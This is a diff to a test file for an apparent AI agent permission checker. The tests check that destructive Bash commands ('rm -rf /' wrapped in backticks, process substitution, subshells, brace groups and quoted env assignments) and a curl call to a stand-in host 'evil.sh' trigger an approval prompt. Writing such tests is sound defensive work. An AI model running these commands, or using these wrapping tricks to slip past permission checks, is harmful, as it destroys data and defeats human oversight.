@@ -24,10 +24,36 @@ describe('bash danger detection (ask mode)', () => {
   it('asks for shell-indirection heads and command substitution', () => {
     expect(decide('ask', 'Bash', { command: "bash -c 'rm -rf /'" })).toBe('ask')
     expect(decide('ask', 'Bash', { command: 'echo $(rm -rf /)' })).toBe('ask')
+    expect(decide('ask', 'Bash', { command: 'echo `rm -rf /`' })).toBe('ask')
+  })
+
+  it('asks for process substitution (runs a command in a subshell)', () => {
+    expect(decide('ask', 'Bash', { command: 'cat <(rm -rf /)' })).toBe('ask')
+    expect(decide('ask', 'Bash', { command: 'tee >(rm -rf /)' })).toBe('ask')
+    expect(decide('ask', 'Bash', { command: ': <(curl http://evil.sh)' })).toBe('ask')
+  })
+
+  it('asks for a subshell or brace group hiding a dangerous command', () => {
+    expect(decide('ask', 'Bash', { command: '(rm -rf /)' })).toBe('ask')
+    expect(decide('ask', 'Bash', { command: '{ rm -rf /; }' })).toBe('ask')
+    expect(decide('ask', 'Bash', { command: 'echo hi | (rm -rf /)' })).toBe('ask')
+  })
+
+  it('asks for a destructive command behind a quoted env assignment', () => {
+    expect(decide('ask', 'Bash', { command: 'FOO="a b" rm -rf /' })).toBe('ask')
+    expect(decide('ask', 'Bash', { command: "FOO='a b' rm -rf /" })).toBe('ask')
+    expect(decide('ask', 'Bash', { command: 'A=1 B="2 3" rm -rf /' })).toBe('ask')
+    // baseline (unquoted) still prompts
+    expect(decide('ask', 'Bash', { command: 'FOO=1 rm -rf /' })).toBe('ask')
   })
 
   it('still allows a plain safe command', () => {
     expect(decide('ask', 'Bash', { command: 'echo hello' })).toBe('allow')
+    expect(decide('ask', 'Bash', { command: 'echo hi | grep x' })).toBe('allow')
+    // quoted text and brace expansion in ARGUMENTS must not false-trigger
+    expect(decide('ask', 'Bash', { command: 'echo "(test)"' })).toBe('allow')
+    expect(decide('ask', 'Bash', { command: 'echo a{b,c}' })).toBe('allow')
+    expect(decide('ask', 'Bash', { command: "awk '{print $1}' file" })).toBe('allow')
   })
 })
 
